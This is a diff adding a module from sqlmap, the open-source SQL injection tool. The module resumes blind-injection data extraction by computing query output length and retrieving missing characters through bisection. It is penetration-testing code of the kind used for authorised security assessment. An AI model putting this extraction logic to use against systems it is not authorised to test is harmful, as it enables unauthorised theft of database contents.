@@ -1,0 +1,184 @@
+#!/usr/bin/env python
+
+"""
+$Id: resume.py 294M 2008-10-14 23:49:41Z (local) $
+
+This file is part of the sqlmap project, http://sqlmap.sourceforge.net.
+
+Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
+                        and Daniele Bellucci <daniele.bellucci@gmail.com>
+
+sqlmap is free software; you can redistribute it and/or modify it under
+the terms of the GNU General Public License as published by the Free
+Software Foundation version 2 of the License.
+
+sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
+WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
+details.
+
+You should have received a copy of the GNU General Public License along
+with sqlmap; if not, write to the Free Software Foundation, Inc., 51
+Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+"""
+
+
+
+import re
+
+from lib.core.common import dataToSessionFile
+from lib.core.data import conf
+from lib.core.data import kb
+from lib.core.data import logger
+from lib.core.data import queries
+from lib.core.unescaper import unescaper
+from lib.techniques.inference.blind import bisection
+
+
+def queryOutputLength(expression, payload):
+    """
+    Returns the query output length.
+    """
+
+    lengthQuery         = queries[kb.dbms].length
+
+    select              = re.search("\ASELECT\s+", expression, re.I)
+    selectTopExpr       = re.search("\ASELECT\s+TOP\s+[\d]+\s+(.+?)\s+FROM", expression, re.I)
+    selectDistinctExpr  = re.search("\ASELECT\s+DISTINCT\((.+?)\)\s+FROM", expression, re.I)
+    selectExpr          = re.search("\ASELECT\s+(.+?)\s+FROM", expression, re.I)
+    miscExpr            = re.search("\A(.+)", expression, re.I)
+
+    if selectTopExpr or selectDistinctExpr or selectExpr:
+        if selectTopExpr:
+            regExpr = selectTopExpr.groups()[0]
+        elif selectDistinctExpr:
+            regExpr = selectDistinctExpr.groups()[0]
+        elif selectExpr:
+            regExpr = selectExpr.groups()[0]
+    elif miscExpr:
+        regExpr = miscExpr.groups()[0]
+
+    if ( select and re.search("\A(COUNT|LTRIM)\(", regExpr, re.I) ) or len(regExpr) <= 1:
+        return None, None, None
+
+    if select:
+        lengthExpr = expression.replace(regExpr, lengthQuery % regExpr, 1)
+    else:
+        lengthExpr = lengthQuery % expression
+
+    infoMsg = "retrieving the length of query output"
+    logger.info(infoMsg)
+
+    output = resume(lengthExpr, payload)
+
+    if output:
+        return 0, output, regExpr
+
+    dataToSessionFile("[%s][%s][%s][%s][" % (conf.url, kb.injPlace, conf.parameters[kb.injPlace], lengthExpr))
+
+    lengthExprUnescaped = unescaper.unescape(lengthExpr)
+    count, length       = bisection(payload, lengthExprUnescaped)
+
+    if length == " ":
+        length = 0
+
+    return count, length, regExpr
+
+
+def resume(expression, payload):
+    """
+    This function can be called to resume part or entire output of a
+    SQL injection query output.
+    """
+
+    condition = (
+                  kb.resumedQueries and conf.url in kb.resumedQueries.keys()
+                  and expression in kb.resumedQueries[conf.url].keys()
+                )
+
+    if not condition:
+        return None
+
+    resumedValue = kb.resumedQueries[conf.url][expression]
+
+    if not resumedValue:
+        return None
+
+    if resumedValue[-1] == "]":
+        resumedValue = resumedValue[:-1]
+
+        infoMsg   = "read from file '%s': " % conf.sessionFile
+        logValue = re.findall("__START__(.*?)__STOP__", resumedValue, re.S)
+
+        if logValue:
+            logValue = ", ".join([value.replace("__DEL__", ", ") for value in logValue])
+        else:
+            logValue = resumedValue
+
+        if "\n" in logValue:
+            infoMsg += "%s..." % logValue.split("\n")[0]
+        else:
+            infoMsg += logValue
+
+        logger.info(infoMsg)
+
+        return resumedValue
+
+    # If we called this function without providing a payload it means that
+    # we have called it from lib/request/inject __goInband() function
+    # in UNION SELECT (inband) SQL injection so we return to the calling
+    # function so that the query output will be retrieved taking advantage
+    # of the inband SQL injection vulnerability.
+    if not payload:
+        return None
+
+    expressionUnescaped = unescaper.unescape(expression)
+    substringQuery = queries[kb.dbms].substring
+    select = re.search("\ASELECT ", expression, re.I)
+
+    _, length, regExpr = queryOutputLength(expression, payload)
+
+    if not length:
+        return None
+
+    if len(resumedValue) == int(length):
+        infoMsg  = "read from file '%s': " % conf.sessionFile
+        infoMsg += "%s" % resumedValue.split("\n")[0]
+        logger.info(infoMsg)
+
+        if conf.sessionFile:
+            dataToSessionFile("[%s][%s][%s][%s][%s]\n" % (conf.url, kb.injPlace, conf.parameters[kb.injPlace], expression, resumedValue))
+
+        return resumedValue
+    elif len(resumedValue) < int(length):
+        infoMsg  = "resumed from file '%s': " % conf.sessionFile
+        infoMsg += "%s..." % resumedValue.split("\n")[0]
+        logger.info(infoMsg)
+
+        if conf.sessionFile:
+            dataToSessionFile("[%s][%s][%s][%s][%s" % (conf.url, kb.injPlace, conf.parameters[kb.injPlace], expression, resumedValue))
+
+        if select:
+            newExpr = expressionUnescaped.replace(regExpr, substringQuery % (regExpr, len(resumedValue) + 1, int(length)), 1)
+        else:
+            newExpr = substringQuery % (expressionUnescaped, len(resumedValue) + 1, int(length))
+
+        missingCharsLength = int(length) - len(resumedValue)
+
+        infoMsg  = "retrieving pending %d query " % missingCharsLength
+        infoMsg += "output characters"
+        logger.info(infoMsg)
+
+        _, finalValue = bisection(payload, newExpr, length=missingCharsLength)
+
+        if len(finalValue) != ( int(length) - len(resumedValue) ):
+            warnMsg  = "the total length of the query is not "
+            warnMsg += "right, sqlmap is going to retrieve the "
+            warnMsg += "query value from the beginning now"
+            logger.warn(warnMsg)
+
+            return None
+
+        return "%s%s" % (resumedValue, finalValue)
+
+    return None
